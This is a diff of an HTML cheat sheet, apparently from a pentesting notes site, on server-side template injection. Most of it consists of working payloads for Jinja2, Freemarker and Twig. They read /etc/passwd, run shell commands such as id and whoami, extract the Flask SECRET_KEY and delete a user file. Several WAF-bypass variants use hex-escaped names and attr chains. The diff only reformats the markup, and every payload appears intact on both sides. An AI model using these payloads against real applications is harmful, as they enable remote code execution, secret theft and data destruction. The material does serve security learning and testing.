-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">%</span> <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">os</span> <span style="color:#f92672">%</span>}} {{<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#39;/home/carlos/morale.txt&#39;</span>)
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">%</span> <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">os</span> <span style="color:#f92672">%</span>}} {{<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#39;/home/carlos/morale.txt&#39;</span>)</span></span></code></pre></div></li>
 </ul>
-<h3 id="object-listing">
-  Object Listing
-  <a class="anchor" href="#object-listing">#</a>
-</h3>
+<h3 id="object-listing">Object Listing<a class="anchor" href="#object-listing">#</a></h3>
 <ul>
 <li>There are mainly two type of objects used
 <ul>
@@ -1662,187 +1584,104 @@ Template Engine
 <li>One can list available objects to craft a payload</li>
 <li>For a Java based template engine one can use this to list all the available objects</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">T</span>(<span style="color:#a6e22e">java</span>.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">System</span>).<span style="color:#a6e22e">getenv</span>()}
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">T</span>(<span style="color:#a6e22e">java</span>.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">System</span>).<span style="color:#a6e22e">getenv</span>()}</span></span></code></pre></div><ul>
 <li>In Django Template one can list all the available objects using debug</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#a6e22e">debug</span> <span style="color:#f92672">%</span>}
-</span></span></code></pre></div><h3 id="object-chaining">
-  Object Chaining
-  <a class="anchor" href="#object-chaining">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#a6e22e">debug</span> <span style="color:#f92672">%</span>}</span></span></code></pre></div><h3 id="object-chaining">Object Chaining<a class="anchor" href="#object-chaining">#</a></h3>
 <p>After finding out the available objects one can chain them up to make the final payload</p>
-<h2 id="jinja2">
-  Jinja2
-  <a class="anchor" href="#jinja2">#</a>
-</h2>
-<h3 id="docs">
-  Docs
-  <a class="anchor" href="#docs">#</a>
-</h3>
+<h2 id="jinja2">Jinja2<a class="anchor" href="#jinja2">#</a></h2>
+<h3 id="docs">Docs<a class="anchor" href="#docs">#</a></h3>
 <ul>
 <li>The print statement started with <code>{ … }</code></li>
 <li>Any code to execute <strong><code>{{…}}</code></strong></li>
 <li>The code block started with <strong><code>{% … %}</code></strong></li>
 <li>Comment ⇒  <strong><code>{\* … *\}</code></strong></li>
 </ul>
-<h3 id="information-disclosure">
-  Information Disclosure
-  <a class="anchor" href="#information-disclosure">#</a>
-</h3>
+<h3 id="information-disclosure">Information Disclosure<a class="anchor" href="#information-disclosure">#</a></h3>
 <p>We can reveal internal configuration details and source code of the web application by using the payload as</p>
-<h3 id="configuration-details">
-  Configuration Details
-  <a class="anchor" href="#configuration-details">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ config<span style="color:#f92672">.</span>items() }}  <span style="color:#f92672">=&gt;</span> undefined
-</span></span></code></pre></div><h3 id="built-in-functions">
-  Built-in Functions
-  <a class="anchor" href="#built-in-functions">#</a>
-</h3>
+<h3 id="configuration-details">Configuration Details<a class="anchor" href="#configuration-details">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ config<span style="color:#f92672">.</span>items() }}  <span style="color:#f92672">=&gt;</span> undefined</span></span></code></pre></div><h3 id="built-in-functions">Built-in Functions<a class="anchor" href="#built-in-functions">#</a></h3>
 <p>To list all built in functions we can use this payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__ }}
-</span></span></code></pre></div><h3 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__ }}</span></span></code></pre></div><h3 id="impact">Impact<a class="anchor" href="#impact">#</a></h3>
 <ul>
 <li><strong><code>LFI</code></strong></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read() }}
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read() }}</span></span></code></pre></div><ul>
 <li>This payload exploits a <strong>Server-Side Template Injection</strong> vulnerability in the <strong>Jinja2</strong> by using <code>self</code> to access the template object&rsquo;s <code>__init__</code> function, then its <code>__globals__</code> dictionary to reach Python <code>__builtins__</code>, from which it calls the built-in <code>open()</code> function to open <code>/etc/passwd</code> and <code>read()</code> its contents, thereby exposing sensitive user account data from a <strong>Linux</strong> server.</li>
 <li><strong><code>RCE</code></strong></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{ self.__init__.__globals__.__builtins__.__import__(<span style="color:#e6db74">&#39;os&#39;</span>).popen(<span style="color:#e6db74">&#39;id&#39;</span>).read() }}
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request.application.__globals__.__builtins__.__import__(<span style="color:#e6db74">&#39;os&#39;</span>).popen(<span style="color:#e6db74">&#39;id&#39;</span>).read()}}
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{ self.__init__.__globals__.__builtins__.__import__(<span style="color:#e6db74">&#39;os&#39;</span>).popen(<span style="color:#e6db74">&#39;id&#39;</span>).read() }}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request.application.__globals__.__builtins__.__import__(<span style="color:#e6db74">&#39;os&#39;</span>).popen(<span style="color:#e6db74">&#39;id&#39;</span>).read()}}</span></span></code></pre></div><ul>
 <li>It is accessing the <code>request</code> object to reach <code>application.__globals__.__builtins__</code>, using the built-in <code>__import__()</code> function to load the <strong>os</strong> module, executing the system command <code>id</code> through <code>os.popen()</code>, and returning its output with <code>read()</code>, effectively achieving command execution on the underlying <strong>Linux</strong> server.</li>
 </ul>
-<h2 id="freemarker-java">
-  Freemarker (Java)
-  <a class="anchor" href="#freemarker-java">#</a>
-</h2>
-<h3 id="basic-java-injection-payloads">
-  Basic Java Injection Payloads
-  <a class="anchor" href="#basic-java-injection-payloads">#</a>
-</h3>
+<h2 id="freemarker-java">Freemarker (Java)<a class="anchor" href="#freemarker-java">#</a></h2>
+<h3 id="basic-java-injection-payloads">Basic Java Injection Payloads<a class="anchor" href="#basic-java-injection-payloads">#</a></h3>
 <ul>
 <li>Extracting the environmental information</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{ T(java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>System)<span style="color:#f92672">.</span>getenv() }
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{ T(java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>System)<span style="color:#f92672">.</span>getenv() }</span></span></code></pre></div><ul>
 <li>It is using <code>T()</code> to access the <strong>Java</strong> class <code>java.lang.System</code> and calling <code>getenv()</code> to retrieve and display all environment variables from the server.</li>
 <li>Running Arbitrary Commands</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span> T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>cat <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">}</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{ <span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#960050;background-color:#1e0010">?</span>new()(<span style="color:#e6db74">&#39;whoami&#39;</span>) }
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${ T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Runtime</span>).<span style="color:#a6e22e">getRuntime</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>cat <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd<span style="color:#960050;background-color:#1e0010">&#39;</span>) }</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>{ <span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#960050;background-color:#1e0010">?</span>new()(<span style="color:#e6db74">&#39;whoami&#39;</span>) }</span></span></code></pre></div><ul>
 <li>It is creating an instance of <code>freemarker.template.utility.Execute</code> using <code>?new()</code> and executing the system command <code>whoami</code>, allowing command execution on the underlying <strong>Linux</strong> server.</li>
 </ul>
-<h3 id="impact-1">
-  Impact
-  <a class="anchor" href="#impact-1">#</a>
-</h3>
+<h3 id="impact-1">Impact<a class="anchor" href="#impact-1">#</a></h3>
 <ul>
 <li><strong><code>RCE</code></strong>
 <ul>
 <li>
 <p>Here <strong><code>?new()</code></strong> is a built in method to create a new instance. The <strong><code>Execute</code></strong> class is a dynamic class, so we have to create a new instance to use it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span>assign ex<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span><span style="color:#f92672">()&gt;</span>$<span style="color:#f92672">{</span>ex<span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>whoami<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span>assign ex<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()<span style="color:#f92672">&gt;</span>${ex(<span style="color:#960050;background-color:#1e0010">&#39;</span>whoami<span style="color:#960050;background-color:#1e0010">&#39;</span>)}</span></span></code></pre></div></li>
 </ul>
 </li>
 </ul>
-<h2 id="twig-php">
-  Twig (PHP)
-  <a class="anchor" href="#twig-php">#</a>
-</h2>
-<h3 id="information-disclosure-1">
-  Information Disclosure
-  <a class="anchor" href="#information-disclosure-1">#</a>
-</h3>
+<h2 id="twig-php">Twig (PHP)<a class="anchor" href="#twig-php">#</a></h2>
+<h3 id="information-disclosure-1">Information Disclosure<a class="anchor" href="#information-disclosure-1">#</a></h3>
 <p>One can extract current template name</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ _self }}     <span style="color:#f92672">=&gt;</span> Current template name 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ _self }}     <span style="color:#f92672">=&gt;</span> Current template name 
 </span></span><span style="display:flex;"><span>{{ _context }}  <span style="color:#f92672">=&gt;</span> current context
-</span></span><span style="display:flex;"><span>{{ _charset }}  <span style="color:#f92672">=&gt;</span> References the current charset 
-</span></span></code></pre></div><h3 id="impact-2">
-  Impact
-  <a class="anchor" href="#impact-2">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>{{ _charset }}  <span style="color:#f92672">=&gt;</span> References the current charset </span></span></code></pre></div><h3 id="impact-2">Impact<a class="anchor" href="#impact-2">#</a></h3>
 <ul>
 <li>
 <p>LFI</p>
 <p>Reading and Including local files is not possible by using any by default function of twig. But if the back end is using a PHP based web framework like <strong><code>symfony</code> ,</strong> that defines some additional twig filters. Like <strong><code>file_excerpt</code></strong> helps to read server side files</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#34;/etc/passwd&#34;</span><span style="color:#f92672">|</span><span style="color:#a6e22e">file_excerpt</span>(<span style="color:#ae81ff">1</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) }}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#34;/etc/passwd&#34;</span><span style="color:#f92672">|</span><span style="color:#a6e22e">file_excerpt</span>(<span style="color:#ae81ff">1</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) }}</span></span></code></pre></div></li>
 <li>
 <p>RCE</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{{ [<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">|</span> <span style="color:#a6e22e">filter</span>(<span style="color:#e6db74">&#39;system&#39;</span>) }}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{{ [<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">|</span> <span style="color:#a6e22e">filter</span>(<span style="color:#e6db74">&#39;system&#39;</span>) }}</span></span></code></pre></div></li>
 </ul>
-<h2 id="advanced-attacks">
-  Advanced Attacks
-  <a class="anchor" href="#advanced-attacks">#</a>
-</h2>
-<h3 id="bypassing-waf-filter----">
-  Bypassing WAF Filter ⇒ ‘ . ’
-  <a class="anchor" href="#bypassing-waf-filter----">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request[<span style="color:#e6db74">&#39;application&#39;</span>][<span style="color:#e6db74">&#39;__globals__&#39;</span>][<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)[<span style="color:#e6db74">&#39;popen&#39;</span>](<span style="color:#e6db74">&#39;id&#39;</span>)[<span style="color:#e6db74">&#39;read&#39;</span>]()}}
-</span></span></code></pre></div><h3 id="filter------and--_-">
-  Filter ⇒ ‘ . ’  and ‘ _ ’
-  <a class="anchor" href="#filter------and--_-">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request[<span style="color:#e6db74">&#39;application&#39;</span>][<span style="color:#e6db74">&#39;\x5f\x5fglobals\x5f\x5f&#39;</span>][<span style="color:#e6db74">&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span>][<span style="color:#e6db74">&#39;\x5f\x5fimport\x5f\x5f&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)[<span style="color:#e6db74">&#39;popen&#39;</span>](<span style="color:#e6db74">&#39;id&#39;</span>)[<span style="color:#e6db74">&#39;read&#39;</span>]()}}
-</span></span></code></pre></div><h3 id="filter-----and--_--and----">
-  Filter ⇒ ‘ . ’ and ‘ _ ’ and ‘ [ ] ’
-  <a class="anchor" href="#filter-----and--_--and----">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request|attr(<span style="color:#e6db74">&#39;application&#39;</span>)|attr(<span style="color:#e6db74">&#39;\x5f\x5fglobals\x5f\x5f&#39;</span>)|attr(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span>)|attr(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fimport\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;os&#39;</span>)|attr(<span style="color:#e6db74">&#39;popen&#39;</span>)(<span style="color:#e6db74">&#39;id&#39;</span>)|attr(<span style="color:#e6db74">&#39;read&#39;</span>)()}}
-</span></span></code></pre></div><h3 id="extracting-secret_key-in-jinja">
-  Extracting SECRET_KEY in Jinja
-  <a class="anchor" href="#extracting-secret_key-in-jinja">#</a>
-</h3>
+<h2 id="advanced-attacks">Advanced Attacks<a class="anchor" href="#advanced-attacks">#</a></h2>
+<h3 id="bypassing-waf-filter----">Bypassing WAF Filter ⇒ ‘ . ’<a class="anchor" href="#bypassing-waf-filter----">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request[<span style="color:#e6db74">&#39;application&#39;</span>][<span style="color:#e6db74">&#39;__globals__&#39;</span>][<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)[<span style="color:#e6db74">&#39;popen&#39;</span>](<span style="color:#e6db74">&#39;id&#39;</span>)[<span style="color:#e6db74">&#39;read&#39;</span>]()}}</span></span></code></pre></div><h3 id="filter------and--_-">Filter ⇒ ‘ . ’  and ‘ _ ’<a class="anchor" href="#filter------and--_-">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request[<span style="color:#e6db74">&#39;application&#39;</span>][<span style="color:#e6db74">&#39;\x5f\x5fglobals\x5f\x5f&#39;</span>][<span style="color:#e6db74">&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span>][<span style="color:#e6db74">&#39;\x5f\x5fimport\x5f\x5f&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)[<span style="color:#e6db74">&#39;popen&#39;</span>](<span style="color:#e6db74">&#39;id&#39;</span>)[<span style="color:#e6db74">&#39;read&#39;</span>]()}}</span></span></code></pre></div><h3 id="filter-----and--_--and----">Filter ⇒ ‘ . ’ and ‘ _ ’ and ‘ [ ] ’<a class="anchor" href="#filter-----and--_--and----">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{request|attr(<span style="color:#e6db74">&#39;application&#39;</span>)|attr(<span style="color:#e6db74">&#39;\x5f\x5fglobals\x5f\x5f&#39;</span>)|attr(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span>)|attr(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fimport\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;os&#39;</span>)|attr(<span style="color:#e6db74">&#39;popen&#39;</span>)(<span style="color:#e6db74">&#39;id&#39;</span>)|attr(<span style="color:#e6db74">&#39;read&#39;</span>)()}}</span></span></code></pre></div><h3 id="extracting-secret_key-in-jinja">Extracting SECRET_KEY in Jinja<a class="anchor" href="#extracting-secret_key-in-jinja">#</a></h3>
 <ul>
 <li>By using the <strong><code>config</code></strong> object we can list a number of key value pair, there we can find the key named as <strong><code>SECRET_KEY</code></strong> which is used to sign user cookies</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{ config[<span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>] }}
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{ config[<span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>] }}</span></span></code></pre></div><ul>
 <li>If the config is blacklisted or filtered, we can use the <strong><code>self</code></strong> object, then we have to use CTRL + F to find for the word SECRET_KEY</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{ self.__dict__ }}
-</span></span></code></pre></div><h3 id="python-literal-hex-encoding">
-  Python Literal Hex Encoding
-  <a class="anchor" href="#python-literal-hex-encoding">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{{ self.__dict__ }}</span></span></code></pre></div><h3 id="python-literal-hex-encoding">Python Literal Hex Encoding<a class="anchor" href="#python-literal-hex-encoding">#</a></h3>
 <ul>
 <li>We can convert the quoted strings into hex representation. If there is any <code>waf</code> that blocks the double and single quote we can use this bypass method.</li>
 <li>This payload</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ g<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">30</span>](<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read() }}
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ g<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">30</span>](<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read() }}</span></span></code></pre></div><ul>
 <li>Can be written as</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ g<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">30</span>](<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>read() }}
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ g<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">30</span>](<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>read() }}</span></span></code></pre></div><ul>
 <li>This can be easily achieved by using the <strong><code>.hex()</code></strong> method in python</li>
 </ul>
